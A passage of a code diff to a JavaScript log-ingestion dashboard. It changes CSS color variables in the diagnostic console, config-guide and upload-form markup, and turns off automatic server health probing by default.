   // TAB 4: SERVER CONNECTION CHECK & HEALTH RADAR
   // ==============================================================================
   let autoProbeIntervalId = null;
-  let isAutoProbeEnabled = true;
+  let isAutoProbeEnabled = false;
 
   function appendDiagnosticLog(level, msg) {
     const feed = document.getElementById("diagnosticConsoleFeed");
@@ -1533,14 +1561,14 @@ document.addEventListener("DOMContentLoaded", () => {
       ERR: "#f87171",
       INFO: "#7dd3fc",
     };
-    line.innerHTML = `<span style="color:var(--text-muted);">[${timeStr}]</span> <span style="color:${colors[level] || '#fff'}; font-weight:700;">[${level}]</span> <span style="color:#F1F5F9;">${escapeHtml(msg)}</span>`;
+    line.innerHTML = `<span style="color:var(--text-secondary);">[${timeStr}]</span> <span style="color:${colors[level] || '#fff'}; font-weight:700;">[${level}]</span> <span style="color:#F1F5F9;">${escapeHtml(msg)}</span>`;
     feed.appendChild(line);
     feed.scrollTop = feed.scrollHeight;
   }
 
   window.clearDiagnosticConsole = function () {
     const feed = document.getElementById("diagnosticConsoleFeed");
-    if (feed) feed.innerHTML = '<div style="color:var(--text-muted); text-align:center; padding:20px;">Diagnostic console cleared. Ready for next probe.</div>';
+    if (feed) feed.innerHTML = '<div style="color:var(--text-secondary); text-align:center; padding:20px;">Diagnostic console cleared. Ready for next probe.</div>';
   };
 
   window.checkServerHealth = async function (interactive = false) {
@@ -1913,18 +1941,18 @@ print("Ingestion Ack:", resp.json())`,
       </div>
 
       <div style="margin-top:14px;">
-        <label style="font-size:11px; font-weight:700; color:var(--text-muted); text-transform:uppercase; letter-spacing:0.5px;">1. Copy Configuration Snippet:</label>
+        <label style="font-size:11px; font-weight:700; color:var(--text-secondary); text-transform:uppercase; letter-spacing:0.5px;">1. Copy Configuration Snippet:</label>
         <div class="code-snippet-box">
           <button class="code-copy-btn" onclick="window.copyGuideCode(this)"> Copy Config</button>
           <pre style="margin:0; white-space:pre-wrap;"><code>${escapeHtml(formattedCode)}</code></pre>
         </div>
       </div>
 
-      <div style="margin-top:14px; background:rgba(24,20,19,0.5); border:1px solid rgba(56,189,248,0.2); border-radius:8px; padding:12px;">
+      <div style="margin-top:14px; background:var(--bg-card); border:1px solid var(--border-subtle); border-radius:8px; padding:12px;">
         <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px;">
           <div>
             <span style="font-size:12px; font-weight:700; color:#F1F5F9;">2. Test Live Socket Transmission from this Device Type:</span>
-            <div style="font-size:11px; font-family:var(--font-mono); color:var(--text-muted); margin-top:2px;">Simulates wire delivery of: <i>${escapeHtml(g.testPayload.substring(0, 60))}...</i></div>
+            <div style="font-size:11px; font-family:var(--font-mono); color:var(--text-secondary); margin-top:2px;">Simulates wire delivery of: <i>${escapeHtml(g.testPayload.substring(0, 60))}...</i></div>
           </div>
           <button type="button" class="btn-primary" style="font-size:12px; padding:6px 14px;" onclick="window.sendGuideTestPayload('${key}')">
             <span>Transmit Sample Payload Now</span>
@@ -2430,7 +2458,7 @@ print("Ingestion Ack:", resp.json())`,
         if (uploadStatLatency) uploadStatLatency.textContent = "0 ms";
         if (sampleEventsWrapper) sampleEventsWrapper.style.display = "none";
         if (sampleEventsList) sampleEventsList.innerHTML = "";
-        if (uploadConsoleFeed) uploadConsoleFeed.innerHTML = '<div style="color:var(--text-muted); padding:10px; text-align:center;">Select a log file and click "Start Ingestion / Upload" to view wire execution logs.</div>';
+        if (uploadConsoleFeed) uploadConsoleFeed.innerHTML = '<div style="color:var(--text-secondary); padding:10px; text-align:center;">Select a log file and click "Start Ingestion / Upload" to view wire execution logs.</div>';
         showToast("Log File Ingestion form reset.");
       });
     }
